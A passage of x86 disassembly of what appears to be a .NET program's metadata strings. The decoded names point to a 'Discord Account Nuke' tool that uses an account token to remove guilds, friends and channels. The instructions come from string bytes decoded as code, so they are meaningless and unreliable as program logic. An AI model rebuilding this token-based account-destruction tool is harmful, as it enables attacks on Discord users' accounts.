  403e65:	74 65                	je     0x403ecc
  403e67:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  403e6a:	31 5f 5f             	xor    %ebx,0x5f(%edi)
  403e6d:	73 74                	jae    0x403ee3
  403e6f:	61                   	popa
  403e70:	74 65                	je     0x403ed7
  403e72:	00 44 65 6c          	add    %al,0x6c(%ebp,%eiz,2)
  403e76:	65 74 65             	gs je  0x403ede
  403e79:	00 43 6f             	add    %al,0x6f(%ebx)
  403e7c:	6d                   	insl   (%dx),%es:(%edi)
  403e7d:	70 69                	jo     0x403ee8
  403e7f:	6c                   	insb   (%dx),%es:(%edi)
  403e80:	65 72 47             	gs jb  0x403eca
  403e83:	65 6e                	outsb  %gs:(%esi),(%dx)
  403e85:	65 72 61             	gs jb  0x403ee9
  403e88:	74 65                	je     0x403eef
  403e8a:	64 41                	fs inc %ecx
  403e8c:	74 74                	je     0x403f02
  403e8e:	72 69                	jb     0x403ef9
  403e90:	62 75 74             	bound  %esi,0x74(%ebp)
  403e93:	65 00 47 75          	add    %al,%gs:0x75(%edi)
  403e97:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
  403e9e:	62 
  403e9f:	75 74                	jne    0x403f15
  403ea1:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  403ea6:	75 67                	jne    0x403f0f
  403ea8:	67 61                	addr16 popa
  403eaa:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  403eae:	74 74                	je     0x403f24
  403eb0:	72 69                	jb     0x403f1b
  403eb2:	62 75 74             	bound  %esi,0x74(%ebp)
  403eb5:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  403eba:	75 67                	jne    0x403f23
  403ebc:	67 65 72 42          	addr16 gs jb 0x403f02
  403ec0:	72 6f                	jb     0x403f31
  403ec2:	77 73                	ja     0x403f37
  403ec4:	61                   	popa
  403ec5:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  403ec9:	74 74                	je     0x403f3f
  403ecb:	72 69                	jb     0x403f36
  403ecd:	62 75 74             	bound  %esi,0x74(%ebp)
  403ed0:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  403ed4:	6d                   	insl   (%dx),%es:(%edi)
  403ed5:	56                   	push   %esi
  403ed6:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  403edd:	74 74                	je     0x403f53
  403edf:	72 69                	jb     0x403f4a
  403ee1:	62 75 74             	bound  %esi,0x74(%ebp)
  403ee4:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  403ee8:	73 65                	jae    0x403f4f
  403eea:	6d                   	insl   (%dx),%es:(%edi)
  403eeb:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  403eef:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  403ef6:	72 
  403ef7:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  403efe:	73 79                	jae    0x403f79
  403f00:	6e                   	outsb  %ds:(%esi),(%dx)
  403f01:	63 53 74             	arpl   %edx,0x74(%ebx)
  403f04:	61                   	popa
  403f05:	74 65                	je     0x403f6c
  403f07:	4d                   	dec    %ebp
  403f08:	61                   	popa
  403f09:	63 68 69             	arpl   %ebp,0x69(%eax)
  403f0c:	6e                   	outsb  %ds:(%esi),(%dx)
  403f0d:	65 41                	gs inc %ecx
  403f0f:	74 74                	je     0x403f85
  403f11:	72 69                	jb     0x403f7c
  403f13:	62 75 74             	bound  %esi,0x74(%ebp)
  403f16:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  403f1b:	75 67                	jne    0x403f84
  403f1d:	67 65 72 53          	addr16 gs jb 0x403f74
  403f21:	74 65                	je     0x403f88
  403f23:	70 54                	jo     0x403f79
  403f25:	68 72 6f 75 67       	push   $0x67756f72
  403f2a:	68 41 74 74 72       	push   $0x72747441
  403f2f:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  403f36:	73 73                	jae    0x403fab
  403f38:	65 6d                	gs insl (%dx),%es:(%edi)
  403f3a:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  403f3e:	72 61                	jb     0x403fa1
  403f40:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  403f43:	61                   	popa
  403f44:	72 6b                	jb     0x403fb1
  403f46:	41                   	inc    %ecx
  403f47:	74 74                	je     0x403fbd
  403f49:	72 69                	jb     0x403fb4
  403f4b:	62 75 74             	bound  %esi,0x74(%ebp)
  403f4e:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  403f53:	67 65 74 46          	addr16 gs je 0x403f9d
  403f57:	72 61                	jb     0x403fba
  403f59:	6d                   	insl   (%dx),%es:(%edi)
  403f5a:	65 77 6f             	gs ja  0x403fcc
  403f5d:	72 6b                	jb     0x403fca
  403f5f:	41                   	inc    %ecx
  403f60:	74 74                	je     0x403fd6
  403f62:	72 69                	jb     0x403fcd
  403f64:	62 75 74             	bound  %esi,0x74(%ebp)
  403f67:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  403f6c:	75 67                	jne    0x403fd5
  403f6e:	67 65 72 48          	addr16 gs jb 0x403fba
  403f72:	69 64 64 65 6e 41 74 	imul   $0x7474416e,0x65(%esp,%eiz,2),%esp
  403f79:	74 
  403f7a:	72 69                	jb     0x403fe5
  403f7c:	62 75 74             	bound  %esi,0x74(%ebp)
  403f7f:	65 00 45 78          	add    %al,%gs:0x78(%ebp)
  403f83:	74 65                	je     0x403fea
  403f85:	6e                   	outsb  %ds:(%esi),(%dx)
  403f86:	73 69                	jae    0x403ff1
  403f88:	6f                   	outsl  %ds:(%esi),(%dx)
  403f89:	6e                   	outsb  %ds:(%esi),(%dx)
  403f8a:	41                   	inc    %ecx
  403f8b:	74 74                	je     0x404001
  403f8d:	72 69                	jb     0x403ff8
  403f8f:	62 75 74             	bound  %esi,0x74(%ebp)
  403f92:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  403f96:	73 65                	jae    0x403ffd
  403f98:	6d                   	insl   (%dx),%es:(%edi)
  403f99:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  403f9d:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  403fa4:	69 
  403fa5:	6f                   	outsl  %ds:(%esi),(%dx)
  403fa6:	6e                   	outsb  %ds:(%esi),(%dx)
  403fa7:	41                   	inc    %ecx
  403fa8:	74 74                	je     0x40401e
  403faa:	72 69                	jb     0x404015
  403fac:	62 75 74             	bound  %esi,0x74(%ebp)
  403faf:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  403fb3:	73 65                	jae    0x40401a
  403fb5:	6d                   	insl   (%dx),%es:(%edi)
  403fb6:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  403fba:	6f                   	outsl  %ds:(%esi),(%dx)
  403fbb:	6e                   	outsb  %ds:(%esi),(%dx)
  403fbc:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  403fc2:	74 69                	je     0x40402d
  403fc4:	6f                   	outsl  %ds:(%esi),(%dx)
  403fc5:	6e                   	outsb  %ds:(%esi),(%dx)
  403fc6:	41                   	inc    %ecx
  403fc7:	74 74                	je     0x40403d
  403fc9:	72 69                	jb     0x404034
  403fcb:	62 75 74             	bound  %esi,0x74(%ebp)
  403fce:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  403fd2:	73 65                	jae    0x404039
  403fd4:	6d                   	insl   (%dx),%es:(%edi)
  403fd5:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  403fd9:	65 73 63             	gs jae 0x40403f
  403fdc:	72 69                	jb     0x404047
  403fde:	70 74                	jo     0x404054
  403fe0:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  403fe7:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  403fee:	6f                   	outsl  %ds:(%esi),(%dx)
  403fef:	6d                   	insl   (%dx),%es:(%edi)
  403ff0:	70 69                	jo     0x40405b
  403ff2:	6c                   	insb   (%dx),%es:(%edi)
  403ff3:	61                   	popa
  403ff4:	74 69                	je     0x40405f
  403ff6:	6f                   	outsl  %ds:(%esi),(%dx)
  403ff7:	6e                   	outsb  %ds:(%esi),(%dx)
  403ff8:	52                   	push   %edx
  403ff9:	65 6c                	gs insb (%dx),%es:(%edi)
  403ffb:	61                   	popa
  403ffc:	78 61                	js     0x40405f
  403ffe:	74 69                	je     0x404069
  404000:	6f                   	outsl  %ds:(%esi),(%dx)
  404001:	6e                   	outsb  %ds:(%esi),(%dx)
  404002:	73 41                	jae    0x404045
  404004:	74 74                	je     0x40407a
  404006:	72 69                	jb     0x404071
  404008:	62 75 74             	bound  %esi,0x74(%ebp)
  40400b:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40400f:	73 65                	jae    0x404076
  404011:	6d                   	insl   (%dx),%es:(%edi)
  404012:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  404016:	72 6f                	jb     0x404087
  404018:	64 75 63             	fs jne 0x40407e
  40401b:	74 41                	je     0x40405e
  40401d:	74 74                	je     0x404093
  40401f:	72 69                	jb     0x40408a
  404021:	62 75 74             	bound  %esi,0x74(%ebp)
  404024:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  404028:	73 65                	jae    0x40408f
  40402a:	6d                   	insl   (%dx),%es:(%edi)
  40402b:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40402f:	6f                   	outsl  %ds:(%esi),(%dx)
  404030:	70 79                	jo     0x4040ab
  404032:	72 69                	jb     0x40409d
  404034:	67 68 74 41 74 74    	addr16 push $0x74744174
  40403a:	72 69                	jb     0x4040a5
  40403c:	62 75 74             	bound  %esi,0x74(%ebp)
  40403f:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  404043:	73 65                	jae    0x4040aa
  404045:	6d                   	insl   (%dx),%es:(%edi)
  404046:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40404a:	6f                   	outsl  %ds:(%esi),(%dx)
  40404b:	6d                   	insl   (%dx),%es:(%edi)
  40404c:	70 61                	jo     0x4040af
  40404e:	6e                   	outsb  %ds:(%esi),(%dx)
  40404f:	79 41                	jns    0x404092
  404051:	74 74                	je     0x4040c7
  404053:	72 69                	jb     0x4040be
  404055:	62 75 74             	bound  %esi,0x74(%ebp)
  404058:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  40405c:	6e                   	outsb  %ds:(%esi),(%dx)
  40405d:	74 69                	je     0x4040c8
  40405f:	6d                   	insl   (%dx),%es:(%edi)
  404060:	65 43                	gs inc %ebx
  404062:	6f                   	outsl  %ds:(%esi),(%dx)
  404063:	6d                   	insl   (%dx),%es:(%edi)
  404064:	70 61                	jo     0x4040c7
  404066:	74 69                	je     0x4040d1
  404068:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  40406b:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  404072:	69 
  404073:	62 75 74             	bound  %esi,0x74(%ebp)
  404076:	65 00 76 61          	add    %dh,%gs:0x61(%esi)
  40407a:	6c                   	insb   (%dx),%es:(%edi)
  40407b:	75 65                	jne    0x4040e2
  40407d:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  404081:	63 6f 72             	arpl   %ebp,0x72(%edi)
  404084:	64 20 41 63          	and    %al,%fs:0x63(%ecx)
  404088:	63 6f 75             	arpl   %ebp,0x75(%edi)
  40408b:	74 20                	je     0x4040ad
  40408d:	4e                   	dec    %esi
  40408e:	75 6b                	jne    0x4040fb
  404090:	65 2e 65 78 65       	gs cs js,pn 0x4040fa
  404095:	00 53 79             	add    %dl,0x79(%ebx)
  404098:	73 74                	jae    0x40410e
  40409a:	65 6d                	gs insl (%dx),%es:(%edi)
  40409c:	2e 54                	cs push %esp
  40409e:	68 72 65 61 64       	push   $0x64616572
  4040a3:	69 6e 67 00 45 6e 63 	imul   $0x636e4500,0x67(%esi),%ebp
  4040aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4040ab:	64 69 6e 67 00 53 79 	imul   $0x73795300,%fs:0x67(%esi),%ebp
  4040b2:	73 
  4040b3:	74 65                	je     0x40411a
  4040b5:	6d                   	insl   (%dx),%es:(%edi)
  4040b6:	2e 52                	cs push %edx
  4040b8:	75 6e                	jne    0x404128
  4040ba:	74 69                	je     0x404125
  4040bc:	6d                   	insl   (%dx),%es:(%edi)
  4040bd:	65 2e 56             	gs cs push %esi
  4040c0:	65 72 73             	gs jb  0x404136
  4040c3:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  4040ca:	53                   	push   %ebx
  4040cb:	74 72                	je     0x40413f
  4040cd:	69 6e 67 00 55 72 69 	imul   $0x69725500,0x67(%esi),%ebp
  4040d4:	00 67 65             	add    %ah,0x65(%edi)
  4040d7:	74 5f                	je     0x404138
  4040d9:	54                   	push   %esp
  4040da:	61                   	popa
  4040db:	73 6b                	jae    0x404148
  4040dd:	00 75 72             	add    %dh,0x72(%ebp)
  4040e0:	6c                   	insb   (%dx),%es:(%edi)
  4040e1:	00 50 72             	add    %dl,0x72(%eax)
  4040e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4040e5:	67 72 61             	addr16 jb 0x404149
  4040e8:	6d                   	insl   (%dx),%es:(%edi)
  4040e9:	00 53 79             	add    %dl,0x79(%ebx)
  4040ec:	73 74                	jae    0x404162
  4040ee:	65 6d                	gs insl (%dx),%es:(%edi)
  4040f0:	00 54 6f 6b          	add    %dl,0x6b(%edi,%ebp,2)
  4040f4:	65 6e                	outsb  %gs:(%esi),(%dx)
  4040f6:	00 4d 61             	add    %cl,0x61(%ebp)
  4040f9:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  404100:	69 63 6f 6e 00 73 65 	imul   $0x6573006e,0x6f(%ebx),%esp
  404107:	74 5f                	je     0x404168
  404109:	69 63 6f 6e 00 53 79 	imul   $0x7953006e,0x6f(%ebx),%esp
  404110:	73 74                	jae    0x404186
  404112:	65 6d                	gs insl (%dx),%es:(%edi)
  404114:	2e 52                	cs push %edx
  404116:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  404119:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40411e:	6e                   	outsb  %ds:(%esi),(%dx)
  40411f:	00 54 61 73          	add    %dl,0x73(%ecx,%eiz,2)
  404123:	6b 43 61 6e          	imul   $0x6e,0x61(%ebx),%eax
  404127:	63 65 6c             	arpl   %esp,0x6c(%ebp)
  40412a:	65 64 45             	gs fs inc %ebp
  40412d:	78 63                	js     0x404192
  40412f:	65 70 74             	gs jo  0x4041a6
  404132:	69 6f 6e 00 53 65 74 	imul   $0x74655300,0x6e(%edi),%ebp
  404139:	45                   	inc    %ebp
  40413a:	78 63                	js     0x40419f
  40413c:	65 70 74             	gs jo  0x4041b3
  40413f:	69 6f 6e 00 4e 65 77 	imul   $0x77654e00,0x6e(%edi),%ebp
  404146:	74 6f                	je     0x4041b7
  404148:	6e                   	outsb  %ds:(%esi),(%dx)
  404149:	73 6f                	jae    0x4041ba
  40414b:	66 74 2e             	data16 je 0x40417c
  40414e:	4a                   	dec    %edx
  40414f:	73 6f                	jae    0x4041c0
  404151:	6e                   	outsb  %ds:(%esi),(%dx)
  404152:	00 43 6f             	add    %al,0x6f(%ebx)
  404155:	6e                   	outsb  %ds:(%esi),(%dx)
  404156:	73 6f                	jae    0x4041c7
  404158:	6c                   	insb   (%dx),%es:(%edi)
  404159:	65 4b                	gs dec %ebx
  40415b:	65 79 49             	gs jns 0x4041a7
  40415e:	6e                   	outsb  %ds:(%esi),(%dx)
  40415f:	66 6f                	outsw  %ds:(%esi),(%dx)
  404161:	00 53 6c             	add    %dl,0x6c(%ebx)
  404164:	65 65 70 00          	gs gs jo 0x404168
  404168:	53                   	push   %ebx
  404169:	79 73                	jns    0x4041de
  40416b:	74 65                	je     0x4041d2
  40416d:	6d                   	insl   (%dx),%es:(%edi)
  40416e:	2e 4e                	cs dec %esi
  404170:	65 74 2e             	gs je  0x4041a1
  404173:	48                   	dec    %eax
  404174:	74 74                	je     0x4041ea
  404176:	70 00                	jo     0x404178
  404178:	43                   	inc    %ebx
  404179:	6c                   	insb   (%dx),%es:(%edi)
  40417a:	65 61                	gs popa
  40417c:	72 00                	jb     0x40417e
  40417e:	67 65 74 5f          	addr16 gs je 0x4041e1
  404182:	61                   	popa
  404183:	76 61                	jbe    0x4041e6
  404185:	74 61                	je     0x4041e8
  404187:	72 00                	jb     0x404189
  404189:	73 65                	jae    0x4041f0
  40418b:	74 5f                	je     0x4041ec
  40418d:	61                   	popa
  40418e:	76 61                	jbe    0x4041f1
  404190:	74 61                	je     0x4041f3
  404192:	72 00                	jb     0x404194
  404194:	3c 3e                	cmp    $0x3e,%al
  404196:	74 5f                	je     0x4041f7
  404198:	5f                   	pop    %edi
  404199:	62 75 69             	bound  %esi,0x69(%ebp)
  40419c:	6c                   	insb   (%dx),%es:(%edi)
  40419d:	64 65 72 00          	fs gs jb 0x4041a1
  4041a1:	67 65 74 5f          	addr16 gs je 0x404204
  4041a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4041a6:	77 6e                	ja     0x404216
  4041a8:	65 72 00             	gs jb  0x4041ab
  4041ab:	73 65                	jae    0x404212
  4041ad:	74 5f                	je     0x40420e
  4041af:	6f                   	outsl  %ds:(%esi),(%dx)
  4041b0:	77 6e                	ja     0x404220
  4041b2:	65 72 00             	gs jb  0x4041b5
  4041b5:	55                   	push   %ebp
  4041b6:	73 65                	jae    0x40421d
  4041b8:	72 00                	jb     0x4041ba
  4041ba:	67 65 74 5f          	addr16 gs je 0x40421d
  4041be:	75 73                	jne    0x404233
  4041c0:	65 72 00             	gs jb  0x4041c3
  4041c3:	73 65                	jae    0x40422a
  4041c5:	74 5f                	je     0x404226
  4041c7:	75 73                	jne    0x40423c
  4041c9:	65 72 00             	gs jb  0x4041cc
  4041cc:	47                   	inc    %edi
  4041cd:	65 74 41             	gs je  0x404211
  4041d0:	77 61                	ja     0x404233
  4041d2:	69 74 65 72 00 67 65 	imul   $0x74656700,0x72(%ebp,%eiz,2),%esi
  4041d9:	74 
  4041da:	5f                   	pop    %edi
  4041db:	64 69 73 63 72 69 6d 	imul   $0x696d6972,%fs:0x63(%ebx),%esi
  4041e2:	69 
  4041e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4041e4:	61                   	popa
  4041e5:	74 6f                	je     0x404256
  4041e7:	72 00                	jb     0x4041e9
  4041e9:	73 65                	jae    0x404250
  4041eb:	74 5f                	je     0x40424c
  4041ed:	64 69 73 63 72 69 6d 	imul   $0x696d6972,%fs:0x63(%ebx),%esi
  4041f4:	69 
  4041f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4041f6:	61                   	popa
  4041f7:	74 6f                	je     0x404268
  4041f9:	72 00                	jb     0x4041fb
  4041fb:	47                   	inc    %edi
  4041fc:	65 74 45             	gs je  0x404244
  4041ff:	6e                   	outsb  %ds:(%esi),(%dx)
  404200:	75 6d                	jne    0x40426f
  404202:	65 72 61             	gs jb  0x404266
  404205:	74 6f                	je     0x404276
  404207:	72 00                	jb     0x404209
  404209:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  40420e:	00 53 79             	add    %dl,0x79(%ebx)
  404211:	73 74                	jae    0x404287
  404213:	65 6d                	gs insl (%dx),%es:(%edi)
  404215:	2e 44                	cs inc %esp
  404217:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  40421e:	69 63 73 00 52 65 6d 	imul   $0x6d655200,0x73(%ebx),%esp
  404225:	6f                   	outsl  %ds:(%esi),(%dx)
  404226:	76 65                	jbe    0x40428d
  404228:	47                   	inc    %edi
  404229:	75 69                	jne    0x404294
  40422b:	6c                   	insb   (%dx),%es:(%edi)
  40422c:	64 73 00             	fs jae 0x40422f
  40422f:	52                   	push   %edx
  404230:	65 6d                	gs insl (%dx),%es:(%edi)
  404232:	6f                   	outsl  %ds:(%esi),(%dx)
  404233:	76 65                	jbe    0x40429a
  404235:	46                   	inc    %esi
  404236:	72 69                	jb     0x4042a1
  404238:	65 6e                	outsb  %gs:(%esi),(%dx)
  40423a:	64 73 00             	fs jae 0x40423d
  40423d:	53                   	push   %ebx
  40423e:	79 73                	jns    0x4042b3
  404240:	74 65                	je     0x4042a7
  404242:	6d                   	insl   (%dx),%es:(%edi)
  404243:	2e 52                	cs push %edx
  404245:	75 6e                	jne    0x4042b5
  404247:	74 69                	je     0x4042b2
  404249:	6d                   	insl   (%dx),%es:(%edi)
  40424a:	65 2e 49             	gs cs dec %ecx
  40424d:	6e                   	outsb  %ds:(%esi),(%dx)
  40424e:	74 65                	je     0x4042b5
  404250:	72 6f                	jb     0x4042c1
  404252:	70 53                	jo     0x4042a7
  404254:	65 72 76             	gs jb  0x4042cd
  404257:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  40425e:	73 74                	jae    0x4042d4
  404260:	65 6d                	gs insl (%dx),%es:(%edi)
  404262:	2e 52                	cs push %edx
  404264:	75 6e                	jne    0x4042d4
  404266:	74 69                	je     0x4042d1
  404268:	6d                   	insl   (%dx),%es:(%edi)
  404269:	65 2e 43             	gs cs inc %ebx
  40426c:	6f                   	outsl  %ds:(%esi),(%dx)
  40426d:	6d                   	insl   (%dx),%es:(%edi)
  40426e:	70 69                	jo     0x4042d9
  404270:	6c                   	insb   (%dx),%es:(%edi)
  404271:	65 72 53             	gs jb  0x4042c7
  404274:	65 72 76             	gs jb  0x4042ed
  404277:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  40427e:	62 75 67             	bound  %esi,0x67(%ebp)
  404281:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  404288:	65 
  404289:	73 00                	jae    0x40428b
  40428b:	44                   	inc    %esp
  40428c:	69 73 63 6f 72 64 5f 	imul   $0x5f64726f,0x63(%ebx),%esi
  404293:	41                   	inc    %ecx
  404294:	63 63 6f             	arpl   %esp,0x6f(%ebx)
  404297:	75 74                	jne    0x40430d
  404299:	5f                   	pop    %edi
  40429a:	4e                   	dec    %esi
  40429b:	75 6b                	jne    0x404308
  40429d:	65 73 00             	gs jae 0x4042a0
  4042a0:	67 65 74 5f          	addr16 gs je 0x404303
  4042a4:	66 65 61             	gs popaw
  4042a7:	74 75                	je     0x40431e
  4042a9:	72 65                	jb     0x404310
  4042ab:	73 00                	jae    0x4042ad
  4042ad:	73 65                	jae    0x404314
  4042af:	74 5f                	je     0x404310
  4042b1:	66 65 61             	gs popaw
  4042b4:	74 75                	je     0x40432b
  4042b6:	72 65                	jb     0x40431d
  4042b8:	73 00                	jae    0x4042ba
  4042ba:	67 65 74 5f          	addr16 gs je 0x40431d
  4042be:	70 75                	jo     0x404335
  4042c0:	62 6c 69 63          	bound  %ebp,0x63(%ecx,%ebp,2)
  4042c4:	5f                   	pop    %edi
  4042c5:	66 6c                	data16 insb (%dx),%es:(%edi)
  4042c7:	61                   	popa
  4042c8:	67 73 00             	addr16 jae 0x4042cb
  4042cb:	73 65                	jae    0x404332
  4042cd:	74 5f                	je     0x40432e
  4042cf:	70 75                	jo     0x404346
  4042d1:	62 6c 69 63          	bound  %ebp,0x63(%ecx,%ebp,2)
  4042d5:	5f                   	pop    %edi
  4042d6:	66 6c                	data16 insb (%dx),%es:(%edi)
  4042d8:	61                   	popa
  4042d9:	67 73 00             	addr16 jae 0x4042dc
  4042dc:	61                   	popa
  4042dd:	72 67                	jb     0x404346
  4042df:	73 00                	jae    0x4042e1
  4042e1:	53                   	push   %ebx
  4042e2:	79 73                	jns    0x404357
  4042e4:	74 65                	je     0x40434b
  4042e6:	6d                   	insl   (%dx),%es:(%edi)
  4042e7:	2e 54                	cs push %esp
  4042e9:	68 72 65 61 64       	push   $0x64616572
  4042ee:	69 6e 67 2e 54 61 73 	imul   $0x7361542e,0x67(%esi),%ebp
  4042f5:	6b 73 00 52          	imul   $0x52,0x0(%ebx),%esi
  4042f9:	65 6d                	gs insl (%dx),%es:(%edi)
  4042fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4042fc:	76 65                	jbe    0x404363
  4042fe:	43                   	inc    %ebx
  4042ff:	68 61 6e 6e 65       	push   $0x656e6e61
  404304:	6c                   	insb   (%dx),%es:(%edi)
  404305:	73 00                	jae    0x404307
  404307:	67 65 74 5f          	addr16 gs je 0x40436a
  40430b:	70 65                	jo     0x404372
  40430d:	72 6d                	jb     0x40437c
  40430f:	69 73 73 69 6f 6e 73 	imul   $0x736e6f69,0x73(%ebx),%esi
  404316:	00 73 65             	add    %dh,0x65(%ebx)
  404319:	74 5f                	je     0x40437a
  40431b:	70 65                	jo     0x404382
  40431d:	72 6d                	jb     0x40438c
  40431f:	69 73 73 69 6f 6e 73 	imul   $0x736e6f69,0x73(%ebx),%esi
  404326:	00 53 79             	add    %dl,0x79(%ebx)
  404329:	73 74                	jae    0x40439f
  40432b:	65 6d                	gs insl (%dx),%es:(%edi)
  40432d:	2e 4e                	cs dec %esi
  40432f:	65 74 2e             	gs je  0x404360
  404332:	48                   	dec    %eax
  404333:	74 74                	je     0x4043a9
  404335:	70 2e                	jo     0x404365
  404337:	48                   	dec    %eax
  404338:	65 61                	gs popa
  40433a:	64 65 72 73          	fs gs jb 0x4043b1
  40433e:	00 48 74             	add    %cl,0x74(%eax)
  404341:	74 70                	je     0x4043b3
  404343:	48                   	dec    %eax
  404344:	65 61                	gs popa
  404346:	64 65 72 73          	fs gs jb 0x4043bd
  40434a:	00 48 74             	add    %cl,0x74(%eax)
  40434d:	74 70                	je     0x4043bf
  40434f:	52                   	push   %edx
  404350:	65 71 75             	gs jno 0x4043c8
  404353:	65 73 74             	gs jae 0x4043ca
  404356:	48                   	dec    %eax
  404357:	65 61                	gs popa
  404359:	64 65 72 73          	fs gs jb 0x4043d0
  40435d:	00 67 65             	add    %ah,0x65(%edi)
  404360:	74 5f                	je     0x4043c1
  404362:	44                   	inc    %esp
  404363:	65 66 61             	gs popaw
  404366:	75 6c                	jne    0x4043d4
  404368:	74 52                	je     0x4043bc
  40436a:	65 71 75             	gs jno 0x4043e2
  40436d:	65 73 74             	gs jae 0x4043e4
  404370:	48                   	dec    %eax
  404371:	65 61                	gs popa
  404373:	64 65 72 73          	fs gs jb 0x4043ea
  404377:	00 50 72             	add    %dl,0x72(%eax)
  40437a:	6f                   	outsl  %ds:(%esi),(%dx)
  40437b:	63 65 73             	arpl   %esp,0x73(%ebp)
  40437e:	73 00                	jae    0x404380
  404380:	67 65 74 5f          	addr16 gs je 0x4043e3
  404384:	72 65                	jb     0x4043eb
  404386:	63 69 70             	arpl   %ebp,0x70(%ecx)
  404389:	69 65 6e 74 73 00 73 	imul   $0x73007374,0x6e(%ebp),%esp
  404390:	65 74 5f             	gs je  0x4043f2
  404393:	72 65                	jb     0x4043fa
  404395:	63 69 70             	arpl   %ebp,0x70(%ecx)
  404398:	69 65 6e 74 73 00 43 	imul   $0x43007374,0x6e(%ebp),%esp
  40439f:	6f                   	outsl  %ds:(%esi),(%dx)
  4043a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4043a1:	63 61 74             	arpl   %esp,0x74(%ecx)
  4043a4:	00 44 65 73          	add    %al,0x73(%ebp,%eiz,2)
  4043a8:	65 72 69             	gs jb  0x404414
  4043ab:	61                   	popa
  4043ac:	6c                   	insb   (%dx),%es:(%edi)
  4043ad:	69 7a 65 4f 62 6a 65 	imul   $0x656a624f,0x65(%edx),%edi
  4043b4:	63 74 00 53          	arpl   %esi,0x53(%eax,%eax,1)
  4043b8:	79 73                	jns    0x40442d
  4043ba:	74 65                	je     0x404421
  4043bc:	6d                   	insl   (%dx),%es:(%edi)
  4043bd:	2e 4e                	cs dec %esi
  4043bf:	65 74 00             	gs je  0x4043c2
  4043c2:	57                   	push   %edi
  4043c3:	61                   	popa
  4043c4:	69 74 00 67 65 74 5f 	imul   $0x525f7465,0x67(%eax,%eax,1),%esi
  4043cb:	52 
  4043cc:	65 73 75             	gs jae 0x404444
  4043cf:	6c                   	insb   (%dx),%es:(%edi)
  4043d0:	74 00                	je     0x4043d2
  4043d2:	47                   	inc    %edi
  4043d3:	65 74 52             	gs je  0x404428
  4043d6:	65 73 75             	gs jae 0x40444e
  4043d9:	6c                   	insb   (%dx),%es:(%edi)
  4043da:	74 00                	je     0x4043dc
  4043dc:	53                   	push   %ebx
  4043dd:	65 74 52             	gs je  0x404432
  4043e0:	65 73 75             	gs jae 0x404458
  4043e3:	6c                   	insb   (%dx),%es:(%edi)
  4043e4:	74 00                	je     0x4043e6
  4043e6:	57                   	push   %edi
  4043e7:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  4043eb:	69 65 6e 74 00 48 74 	imul   $0x74480074,0x6e(%ebp),%esp
  4043f2:	74 70                	je     0x404464
  4043f4:	43                   	inc    %ebx
  4043f5:	6c                   	insb   (%dx),%es:(%edi)
  4043f6:	69 65 6e 74 00 63 6c 	imul   $0x6c630074,0x6e(%ebp),%esp
  4043fd:	69 65 6e 74 00 52 65 	imul   $0x65520074,0x6e(%ebp),%esp
  404404:	63 69 70             	arpl   %ebp,0x70(%ecx)
  404407:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  40440e:	74 5f                	je     0x40446f
